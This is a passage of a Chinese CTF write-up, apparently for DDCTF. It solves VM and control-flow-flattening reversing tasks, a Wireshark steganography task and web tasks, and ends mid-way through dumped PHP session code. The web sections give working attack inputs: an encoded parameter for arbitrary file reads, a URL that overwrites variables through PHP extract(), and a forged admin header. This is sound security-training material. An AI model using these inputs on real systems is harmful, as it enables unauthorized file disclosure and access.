<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> __fastcall <span class="title function_">loader</span><span class="params">(vm *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">bool</span> result; <span class="comment">// al</span></span><br><span class="line">  <span class="type">bool</span> v2; <span class="comment">// [rsp+Fh] [rbp-11h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      v2 = i &lt; <span class="number">9</span>;                           </span><br><span class="line">    result = v2;</span><br><span class="line">    <span class="keyword">if</span> ( !v2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *a1-&gt;opcode == *(&amp;a1-&gt;op1 + <span class="number">16</span> * i) )  <span class="comment">// call every func</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = <span class="number">1</span>;</span><br><span class="line">      (*(&amp;a1-&gt;op1_func + <span class="number">2</span> * i))(a1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中虚拟机结构体恢复如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000 vm              struc ; (sizeof=0xB0, mappedto_59)</span><br><span class="line">00000000 temp1           dd ?</span><br><span class="line">00000004 temp2           dd ?</span><br><span class="line">00000008 temp3           dd ?</span><br><span class="line">0000000C temp4           dd ?</span><br><span class="line">00000010 bool            dd ?</span><br><span class="line">00000014 unknown         dd ?</span><br><span class="line">00000018 opcode          dq ?</span><br><span class="line">00000020 op1             dq ?</span><br><span class="line">00000028 op1_func        dq ?</span><br><span class="line">00000030 op2             dq ?</span><br><span class="line">00000038 op2_func        dq ?</span><br><span class="line">00000040 op3             dq ?</span><br><span class="line">00000048 op3_func        dq ?</span><br><span class="line">00000050 op4             dq ?</span><br><span class="line">00000058 op4_func        dq ?</span><br><span class="line">00000060 op5             dq ?</span><br><span class="line">00000068 op5_func        dq ?</span><br><span class="line">00000070 op6             dq ?</span><br><span class="line">00000078 op6_func        dq ?</span><br><span class="line">00000080 op7             dq ?</span><br><span class="line">00000088 op7_func        dq ?</span><br><span class="line">00000090 op8             dq ?</span><br><span class="line">00000098 op8_func        dq ?</span><br><span class="line">000000A0 op9             dq ?</span><br><span class="line">000000A8 op9_func        dq ?</span><br><span class="line">000000B0 vm              ends</span><br><span class="line">000000B0</span><br></pre></td></tr></table></figure></div>

<p>opcode 从 0x000000100001984 地址开始，分析前几条指令得到大致如下的程序逻辑</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">vm -&gt; temp1 = 0x66</span><br><span class="line">vm -&gt; temp1 = 0x68 &#x27;h&#x27;</span><br><span class="line">vm -&gt; temp1 == flag[0] ? vm -&gt; temp5 = 1 : vm -&gt; temp5 = 0</span><br><span class="line">judge vm -&gt; temp5 == 1 ? if not --&gt; fail</span><br><span class="line"></span><br><span class="line">vm -&gt; temp1 = 0x63</span><br><span class="line">vm -&gt; temp1 = 0x65 &#x27;e&#x27;</span><br><span class="line">vm -&gt; temp1 == flag[1] ? vm -&gt; temp5 = 1 : vm -&gt; temp5 = 0</span><br><span class="line">judge vm -&gt; temp5 == 1 ? if not --&gt; fail</span><br><span class="line"></span><br><span class="line">vm -&gt; temp1 = 0x6A</span><br><span class="line">vm -&gt; temp1 = 0x6c &#x27;l&#x27;</span><br><span class="line">vm -&gt; temp1 == flag[1] ? vm -&gt; temp5 = 1 : vm -&gt; temp5 = 0</span><br><span class="line">judge vm -&gt; temp5 == 1 ? if not --&gt; fail</span><br><span class="line"></span><br><span class="line">vm -&gt; temp1 = 0x6A</span><br><span class="line">vm -&gt; temp1 = 0x6c &#x27;l&#x27;</span><br><span class="line">vm -&gt; temp1 == flag[1] ? vm -&gt; temp5 = 1 : vm -&gt; temp5 = 0</span><br><span class="line">judge vm -&gt; temp5 == 1 ? if not --&gt; fail</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>先取出一个字节，然后做一个偏移量为 2 的凯撒加密，再和我们的输入进行比较。</p>
<p>将里面的密文取出来，做一次凯撒解密即可得到 flag</p>
<p>flag: DDCTF{helloYouGotTheFlag}</p>
<h2 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h2><p>题目给了一个数据包，直接用 wireshark 打开，过滤出 http 流量，首先找到了一个网站</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://tools.jb51.net/aideddesign/img_add_info</span><br></pre></td></tr></table></figure></div>

<p>猜测流量包里面用到了这个隐写工具。</p>
<p>然后在一个上传图片的流量包中找到一个 绿色钥匙的图片，在 linux 下面提示 CRC 错误，这通常是由于图片长宽错误导致的。利用 010 editor 修改图片高度拿到一个 key：  57pmYyWt</p>
<p>又找到了另外两张图片，内容一样但是大小不同，将这两张图片传到之前的网站上进行解密，从较大的那张图(1.9M 左右)取得 flag</p>
<p>flag:  DDCTF{QEWokcpHeUo2WOfBIN7pogIWsF04iRjt}</p>
<h2 id="滴"><a href="#滴" class="headerlink" title="滴~"></a>滴~</h2><p>观察 url</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</span><br></pre></td></tr></table></figure></div>

<p>将 jpg 参数后面跟的字符串解码得出字符串 flag.jpg，也就是说我们传入的参数也要进行 转 16 进制 -&gt; BASE64ENCODE -&gt; BASE64ENCODE 才行。</p>
<p>先读取一下 index.php 的内容</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span></span><br><span class="line"><span class="comment"> * Date: July 4,2018</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;jpg&#x27;</span>]))</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;jpg&#x27;</span>])));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;title&gt;&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;jpg&#x27;</span>].<span class="string">&#x27;&lt;/title&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;config&quot;</span>,<span class="string">&quot;!&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$txt</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span>.<span class="variable">$txt</span>.<span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>意思大概是输入的字符串只能包含字母数字和小数点，并且如果包含 config 字符串，会被替换成 !。</p>
<p>访问给出的博客，按照下面的日期找到博主的一篇文章</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://blog.csdn.net/FengBanLiuYun/article/details/80913909</span><br></pre></td></tr></table></figure></div>

<p>尝试访问 practice.txt.swp 得到提示</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">f1ag!ddctf.php</span><br></pre></td></tr></table></figure></div>

<p>于是构造 jpg 参数为</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">TmpZek1UWXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ==</span><br></pre></td></tr></table></figure></div>

<p>得到代码</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"><span class="variable">$k</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$uid</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$content</span>=<span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$k</span>));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$uid</span>==<span class="variable">$content</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span><span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>再构造 url</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://117.51.150.246/f1ag!ddctf.php?uid=f1ag!ddctf.php&amp;k=practice.txt.swp</span><br></pre></td></tr></table></figure></div>

<p>得到 flag:   DDCTF{436f6e67726174756c6174696f6e73}</p>
<h2 id="obfuscating-macros"><a href="#obfuscating-macros" class="headerlink" title="obfuscating macros"></a>obfuscating macros</h2><p>控制流平坦化的一道题目，混淆了两个函数。</p>
<p>首先尝试使用科恩实验室给的脚本 deflat.py，但是在符号执行阶段会卡住，不知道是不是 angr 版本的问题，修复操作失败，但是从 IDA 中看被混淆的函数的伪代码感觉真正的逻辑不会太复杂，于是采用调试的方法，通过在 flag 的位置下硬件断点来追踪程序流程。</p>
<p>总结出两个被混淆的函数的流程，第一个函数限制输入必须是十六进制的字符，和 Windows Reverse2 的算法类似，之后会将输入转换成真正的 16 进制数据。</p>
<p>第二个函数是主要算法，流程如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">检查 flag[0] 是否等于 0？</span><br><span class="line">0x79 - flag[0] 放在另一块内存中</span><br><span class="line">检查 上一步操作结果是否为零</span><br><span class="line"></span><br><span class="line">循环，取出 flag[1] 检查是否等于 0？</span><br><span class="line">0x40 - flag[0] 放在另一块内存中</span><br><span class="line">检查结果是否为 0？</span><br><span class="line">函数逻辑为检查字符串是否达到结尾，如果是则跳出，否则进行减法操作，要求输入和程序硬编码的字符串相等。</span><br></pre></td></tr></table></figure></div>

<p>将硬编码的字节全部取出就可以得到 flag</p>
<p>flag: 79406C61E5EEF319CECEE2ED8498 </p>
<h2 id="Web-签到题"><a href="#Web-签到题" class="headerlink" title="Web 签到题"></a>Web 签到题</h2><p>进去提示需要先获取权限，在 JS 中发现如下代码</p>
<div class="code-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">auth</span>(<span class="params"></span>) &#123;</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;post&quot;</span>,</span><br><span class="line">        <span class="attr">url</span>:<span class="string">&quot;http://117.51.158.44/app/Auth.php&quot;</span>,</span><br><span class="line">        <span class="attr">contentType</span>: <span class="string">&quot;application/json;charset=utf-8&quot;</span>,</span><br><span class="line">        <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">        <span class="attr">beforeSend</span>: <span class="keyword">function</span> (<span class="params">XMLHttpRequest</span>) &#123;</span><br><span class="line">            <span class="title class_">XMLHttpRequest</span>.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;didictf_username&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">getdata</span>) &#123;</span><br><span class="line">           <span class="variable language_">console</span>.<span class="title function_">log</span>(getdata);</span><br><span class="line">           <span class="keyword">if</span>(getdata.<span class="property">data</span> !== <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">               <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;auth&#x27;</span>).<span class="property">innerHTML</span> = getdata.<span class="property">data</span>;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;,<span class="attr">error</span>:<span class="keyword">function</span>(<span class="params">error</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(error);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>那么就在 POST 请求头添加一个 didictf_username 字段试试</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">您当前当前权限为管理员----请访问:app\/fL2XID2i0Cdh.php</span><br></pre></td></tr></table></figure></div>

<p>拿到源代码</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">url:app/Application.php</span><br><span class="line">Class Application &#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$path</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">response</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$errMsg</span> = <span class="string">&#x27;success&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = [<span class="string">&#x27;errMsg&#x27;</span> =&gt; <span class="variable">$errMsg</span>,</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$data</span>];</span><br><span class="line">        <span class="variable">$ret</span> = <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type: application/json&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$ret</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$DIDICTF_ADMIN</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_DIDICTF_USERNAME&#x27;</span>]) &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_DIDICTF_USERNAME&#x27;</span>] == <span class="variable">$DIDICTF_ADMIN</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">response</span>(<span class="string">&#x27;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">TRUE</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">response</span>(<span class="string">&#x27;抱歉，您没有登陆权限，请获取权限后访问-----&#x27;</span>,<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$path</span>);</span><br><span class="line">    <span class="variable">$path</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;../&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$path</span>);</span><br><span class="line">    <span class="variable">$path</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;..\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$path</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;path)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$path</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">sanitizepath</span>(<span class="variable">$this</span>-&gt;path);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$path</span>) !== <span class="number">18</span>) &#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">response</span>(<span class="variable">$data</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>),<span class="string">&#x27;Congratulations&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">url:app/Session.php</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;Application.php&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//key建议为8位字符串</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$eancrykey</span>                  = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cookie_expiration</span>			= <span class="number">7200</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cookie_name</span>                = <span class="string">&#x27;ddctf_id&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cookie_path</span>				= <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cookie_domain</span>				= <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cookie_secure</span>				= <span class="literal">FALSE</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$activity</span>                   = <span class="string">&quot;DiDiCTF&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">parent</span>::<span class="title function_ invoke__">auth</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_key</span>();</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">session_read</span>()) &#123;</span><br><span class="line">                <span class="variable">$data</span> = <span class="string">&#x27;DiDI Welcome you %s&#x27;</span>;</span><br><span class="line">                <span class="variable">$data</span> = <span class="title function_ invoke__">sprintf</span>(<span class="variable">$data</span>,<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]);</span><br><span class="line">                <span class="built_in">parent</span>::<span class="title function_ invoke__">response</span>(<span class="variable">$data</span>,<span class="string">&#x27;sucess&#x27;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">session_create</span>();</span><br><span class="line">                <span class="variable">$data</span> = <span class="string">&#x27;DiDI Welcome you&#x27;</span>;</span><br><span class="line">                <span class="built_in">parent</span>::<span class="title function_ invoke__">response</span>(<span class="variable">$data</span>,<span class="string">&#x27;sucess&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//eancrykey  and flag under the folder</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;eancrykey =  <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;../config/key.txt&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session_read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$session</span> = <span class="variable">$_COOKIE</span>[<span class="variable language_">$this</span>-&gt;cookie_name];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$session</span>)) &#123;</span><br><span class="line">            <span class="built_in">parent</span>::<span class="title function_ invoke__">response</span>(<span class="string">&quot;session not found&quot;</span>,<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$hash</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$session</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$session</span>)-<span class="number">32</span>);</span><br><span class="line">        <span class="variable">$session</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$session</span>,<span class="number">0</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$session</span>)-<span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$hash</span> !== <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;eancrykey.<span class="variable">$session</span>)) &#123;</span><br><span class="line">            <span class="built_in">parent</span>::<span class="title function_ invoke__">response</span>(<span class="string">&quot;the cookie data not match&quot;</span>,<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$session</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$session</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$session</span>) OR !<span class="keyword">isset</span>(<span class="variable">$session</span>[<span class="string">&#x27;session_id&#x27;</span>]) OR !<span class="keyword">isset</span>(<span class="variable">$session</span>[<span class="string">&#x27;ip_address&#x27;</span>]) OR !<span class="keyword">isset</span>(<span class="variable">$session</span>[<span class="string">&#x27;user_agent&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;nickname&quot;</span>])) &#123;</span><br><span class="line">            <span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&quot;nickname&quot;</span>],<span class="variable language_">$this</span>-&gt;eancrykey);</span><br><span class="line">            <span class="variable">$data</span> = <span class="string">&quot;Welcome my friend %s&quot;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">                <span class="variable">$data</span> = <span class="title function_ invoke__">sprintf</span>(<span class="variable">$data</span>,<span class="variable">$v</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">parent</span>::<span class="title function_ invoke__">response</span>(<span class="variable">$data</span>,<span class="string">&quot;Welcome&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$session</span>[<span class="string">&#x27;ip_address&#x27;</span>] != <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) &#123;</span><br><span class="line">            <span class="built_in">parent</span>::<span class="title function_ invoke__">response</span>(<span class="string">&#x27;the ip addree not match&#x27;</span>.<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$session</span>[<span class="string">&#x27;user_agent&#x27;</span>] != <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]) &#123;</span><br><span class="line">            <span class="built_in">parent</span>::<span class="title function_ invoke__">response</span>(<span class="string">&#x27;the user agent not match&#x27;</span>,<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">session_create</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$sessionid</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$sessionid</span>) &lt; <span class="number">32</span>) &#123;</span><br><span class="line">            <span class="variable">$sessionid</span> .= <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="title function_ invoke__">mt_getrandmax</span>());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$userdata</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;session_id&#x27;</span> =&gt; <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>(<span class="variable">$sessionid</span>,<span class="literal">TRUE</span>)),</span><br><span class="line">            <span class="string">&#x27;ip_address&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;user_data&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="variable">$cookiedata</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$userdata</span>);</span><br><span class="line">        <span class="variable">$cookiedata</span> = <span class="variable">$cookiedata</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;eancrykey.<span 